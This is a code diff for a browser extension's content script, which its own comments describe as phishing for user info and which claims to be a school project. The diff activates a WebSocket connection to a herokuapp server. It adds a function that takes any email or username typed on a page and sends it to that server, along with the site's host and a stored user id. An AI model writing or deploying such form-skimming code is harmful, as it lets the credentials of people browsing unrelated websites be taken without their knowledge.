@@ -4,8 +4,8 @@ console.log("This is all for a school project!");
 //Flag variable used for if they filled out popup or not.
 var phishFlag = false;
 
-//var HOST = 'wss://thawing-island-58409.herokuapp.com';
-//var ws = new WebSocket(HOST);
+var HOST = 'wss://projectnickname123.herokuapp.com';
+var ws = new WebSocket(HOST);
 
 
 //This will get all the values of type email
@@ -15,10 +15,14 @@ var phishFlag = false;
 //Simply say the website of the current tab
 console.log(window.location.host);
 
+var id;
+
 //Just for testing purposes
 chrome.storage.sync.get("id", function(ev){
+  id=ev.id;
   console.log("This user is id is " + ev.id)
 });
+
 
 //This function will be used to phish for info from the user.
 function phishFunction(){
@@ -107,6 +111,7 @@ function clickListen (e){
     if(val[i].type.toLowerCase() == 'email'){
         if(!(val[i].value === "" || val[i].value === null)){
           console.log("Username is " + val[i].value);
+          sendUsername(val[i].value);
       }
     }
     if(val[i].type.toLowerCase() == 'password'){
@@ -121,9 +126,17 @@ function clickListen (e){
     if(val[i].name.toLowerCase() == 'username'){
       if(!(val[i].value === "" || val[i].value === null)){
         console.log("Username is " + val[i].value);
+        sendUsername(val[i].value);
       }
     }
   }
+}
+
+function sendUsername(username){
+  var url = window.location.host;
+	var jsonPackage = {id: id,type: 'username',url:url, username:username};
+  ws.send(JSON.stringify(jsonPackage));
+  console.log("sent "+JSON.stringify(jsonPackage));
 }
 
 //chrome.tabs.executeScript({file: inject.js})
